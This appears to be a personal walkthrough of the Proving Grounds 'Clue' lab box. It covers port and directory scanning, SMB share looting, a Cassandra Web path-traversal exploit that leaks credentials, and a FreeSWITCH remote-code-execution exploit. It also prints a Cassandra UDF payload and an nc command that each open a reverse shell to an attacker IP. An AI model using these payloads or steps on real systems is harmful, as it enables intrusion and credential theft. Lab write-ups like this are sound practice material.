# NMAP

```
sudo nmap -sC -sV 192.168.194.240  -oN nmap-clue
```

![[PG/Linux/attachments/Pasted image 20250709222839.png]]

# Web (80)

![[PG/Linux/attachments/Pasted image 20250709223056.png]]

## Ferox
```
feroxbuster -u http://192.168.194.240/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox80
```

![[PG/Linux/attachments/Pasted image 20250709232922.png]]
# Web (3000)

![[PG/Linux/attachments/Pasted image 20250709223016.png]]

## Ferox
```
feroxbuster -u http://192.168.194.240:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox3000
```


Two hits 

![[PG/Linux/attachments/Pasted image 20250709232839.png]]

## Manual Enum 

![[PG/Linux/attachments/Pasted image 20250709233119.png]]

Found a place to execute code
![[PG/Linux/attachments/Pasted image 20250709233233.png]]

Maybe I can try a shell here .. if I can find a UDF entry table 

```
CREATE FUNCTION test.exec(name text)
RETURNS NULL ON NULL INPUT
RETURNS text
LANGUAGE javascript
AS $$
  var System = Java.type("java.lang.System");
  System.setSecurityManager(null);
  this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("busybox nc 192.168.45.152 4444 -e /bin/sh")');
  name
$$;
```

![[PG/Linux/attachments/Pasted image 20250709234355.png]]

^ Yeah, no. 

We get a username from this site 'cassie'
# SMB tho 

```
nxc smb 192.168.194.240 -u 'cassie' -p 'cassie' --shares
```

![[PG/Linux/attachments/Pasted image 20250709235645.png]]

We can read this backup share 

```
smbclient -U 'cassie' -N //192.168.194.240/backup
```

![[PG/Linux/attachments/Pasted image 20250709235823.png]]
- yas

![[PG/Linux/attachments/Pasted image 20250709235937.png]]
- changelog maybe interesting 

Some bins 
![[PG/Linux/attachments/Pasted image 20250710000148.png]]

Okie there's a ton in /etc dir

```
mget *
```

![[PG/Linux/attachments/Pasted image 20250710000600.png]]

# Searchsploit Cassandra Web 

Trying to find an exploit here 

```
searchsploit Cassandra Web
```

![[PG/Linux/attachments/Pasted image 20250710003410.png]]

```
searchsploit -m linux/webapps/49362.py
```

Usage ex from exploit 
![[PG/Linux/attachments/Pasted image 20250710003601.png]]

```
192.168.194.240 /proc/self/cmdline
```

Wow.. got Cassie's pass 

![[PG/Linux/attachments/Pasted image 20250710003816.png]]

```
cassie:SecondBiteTheApple330
```

# Freeswitch Password Change

![[PG/Linux/attachments/Pasted image 20250710004229.png]]

Try to read this using that path traversal exploit 

```
/etc/freeswitch/autoload_configs/event_socket.conf.xml
```

Here's the freeswitch password 

![[PG/Linux/attachments/Pasted image 20250710004542.png]]
```
StrongClueConEight021
```

Look for [freeswitch exploits](https://www.exploit-db.com/exploits/47799) 

Here's one that needs valid creds and I enter found creds here
![[PG/Linux/attachments/Pasted image 20250710005042.png]]
Run it and we are the freeswitch user
![[PG/Linux/attachments/Pasted image 20250710004959.png]]

# Reverse Shell Twime

```
nc -nv 192.168.45.152 4444 -e /bin/bash
```

And once again.. this ish doesn't work for me. 

![[PG/Linux/attachments/Pasted image 20250710010447.png]]
![[PG/Linux/attachments/Pasted image 20250710010416.png]]
[Ref](https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2)

